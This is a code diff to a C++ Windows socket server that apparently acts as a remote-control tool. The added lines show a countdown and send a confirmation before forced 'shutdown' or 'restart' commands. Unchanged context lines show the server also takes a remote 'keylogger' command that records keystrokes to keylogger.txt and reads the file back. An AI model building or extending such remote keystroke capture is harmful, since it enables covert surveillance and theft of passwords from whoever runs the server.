@@ -148,12 +148,32 @@ int main(int argc, char *argv[])
         }
         else WSACleanup();
         if (string(messageFromClient) == "shutdown") {
+            string announcement = "Shutdown server successfully!";
+            strcpy(messageFromServer, announcement.c_str());
+            int sec = 5;
+            while (sec >= 1) {
+                vector<string> content;
+                content.push_back("Shutdown after " + to_string(sec));
+                frame.displayAnimationDefault(content);
+                sec--;
+            }
+            int bytecount = send(acceptSocket, messageFromServer, bufferSize, 0);
             closesocket(acceptSocket);
             WSACleanup();
             system("shutdown /s /f /t 5");
         } 
         else if (string(messageFromClient) == "restart")
         {
+            string announcement = "Restart server successfully!";
+            strcpy(messageFromServer, announcement.c_str());
+            int sec = 5;
+            while (sec >= 1) {
+                vector<string> content;
+                content.push_back("Restart after " + to_string(sec));
+                frame.displayAnimationDefault(content);
+                sec--;
+            } 
+            int bytecount = send(acceptSocket, messageFromServer, bufferSize, 0);
             closesocket(acceptSocket);
             WSACleanup();
             #ifdef _WIN32
@@ -257,7 +277,7 @@ int main(int argc, char *argv[])
         else if (string(messageFromClient) == "keylogger")
         {
             char time[bufferSize] = {};
-            recv(acceptSocket, time, bufferSize, 0);       
+            recv(acceptSocket, time, bufferSize, 0);
             keylogger(stoi(time));
             ifstream file("keylogger.txt", ios::binary | ios::ate);
             if (!file.is_open()) {
